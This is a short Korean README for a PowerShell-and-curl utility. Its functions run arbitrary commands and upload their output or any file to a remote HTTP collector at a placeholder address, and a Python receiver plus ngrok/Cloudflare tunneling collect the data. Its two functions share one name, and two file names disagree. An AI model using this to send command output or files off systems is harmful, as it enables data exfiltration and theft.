# Curl Request Tool

## Tool

```
.
├── curl_function.txt                # 함수 기반 명령어 실행
├── curl_request.bat                 # .bat 파일 실행
├── http_receiver.py                 # 데이터를 받아줄 HTTP 웹 서비스
└── files/                           # 데이터 저장 위치(raw-data, file)
```

## 파일 설명

| File | Description |
|------|------|
| `curl_request.txt` | 함수 기반으로 임시로 사용하는 방식(cli가 종료되면 함수 다시 적용 필요) |
| `curl_request.bat` | bat 파일로 명령어 입력 및 출력 |
| `http_receiver.py` | python http 모듈로 웹 서비스 구축(외부 IP를 사용한다면 포트포워딩 등의 작업 필요) |

## 사용방법

### 1. curl_function.txt
powershell에서 함수를 생성해서, curl을 이용한 데이터/파일을 HTTP 서버로 전송

```powershell
function send-data {
    param($Cmd, $BaseUrl = "http://1.1.1.1:12345")
    # 확장자 있으면 그대로, 없으면 .txt 붙이기
    $bin     = ($Cmd -split " ")[0]
    $fname   = if ($bin -match '\.') { $bin } else { $bin + ".txt" }
    $result  = "===cmd: $Cmd===`r`n" + (Invoke-Expression $Cmd | Out-String)
    curl.exe -s -X POST "$BaseUrl/$fname" -d $result
}

function send-data {
    param($FilePath, $BaseUrl = "http://1.1.1.1:12345")
    $fname = Split-Path $FilePath -Leaf   # 원본 파일명 + 확장자 그대로
    curl.exe -s -X POST "$BaseUrl/$fname" -F "file=@$FilePath"
}
```

### 2. curl_request.bat
데이터 및 파일을 웹 서비스 서버로 전송하는 명령어 실행
- http_receiver에 작성된 코드라인에 맞춰서 데이터 저장

### 3. http_receiver.py
python http 모듈 사용
- 포트만 지정해서 사용할 수 있으나, 외부에서 데이터를 받으려면 포트포워딩 또는 다른 서비스 활용 필요
- ngrok, cloudflare 등